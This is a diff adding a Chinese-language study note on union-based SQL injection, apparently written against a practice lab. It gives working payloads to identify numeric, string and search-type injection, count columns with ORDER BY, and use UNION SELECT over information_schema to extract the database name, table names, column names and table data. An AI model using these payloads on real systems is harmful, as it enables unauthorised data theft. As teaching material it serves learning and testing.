@@ -1,0 +1,72 @@
+### 回显注入：
+能够在页面中查看到结果
+
+SQL语句中注释：
+```
+1. #
+2. -- （注意空格）
+```
+首先判断注入类型：
+- 数字型
+```
+SELECT * FROM users WHERE id=$id     
+        1 and 1=1; 
+        1 and 1=2;
+```
+- 字符型
+```
+SELECT * FROM users WHERE id='$id'
+SELECT * FROM users WHERE id="$id"
+        1' and 1=1 #; 1' and 1=2 # （注：#是为了注释掉后面的'）
+        1" and 1=1 #; 1" and 1=2 # （注：#是为了注释掉后面的"）
+```
+- 搜索型
+```
+SELECT * FROM users WHERE id like '%$id%';
+SELECT * FROM users WHERE id like "%$id%";
+        xxx%' and 1=1 #; xxx%' and 1=2 #
+        xxx%" and 1=1 #; xxx%" and 1=2 #
+```
+--- 猜解SQL查询语句中的字段数：
+```
+SELECT * FROM users WHERE id=$id
+        1 order by {num} 
+
+mysql> select * from users where id=1 order by 3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql> select * from users where id=1 order by 4;
+ERROR 1054 (42S22): Unknown column '4' in 'order clause'
+```
+--- 确定显示的字段顺序：
+靠页面中对应字段下显示的数字顺序来判断SQL语句中字段的查询顺序
+```
+SELECT * FROM users WHERE id=$id
+        1 and 1=2 UNION SELECT 1,2,3
+```
+--- 获取当前数据库：
+```
+SELECT * FROM users WHERE id=$id
+        1 and 1=2 UNION SELECT 1,2,database()
+```
+--- 获取数据库中的表：
+```
+SELECT * FROM users WHERE id=$id
+        1 and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
+    group_concat()：将同一组的记录的不同内容连接成字符串显示
+```
+--- 获取表中的字段名：
+```
+SELECT * FROM users WHERE id=$id
+        1 and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='' 
+```
+--- 获取具体的数据
+```
+SELECT * FROM users WHERE id=$id
+        1 and 1=2 UNION SELECT * from 表名
+```
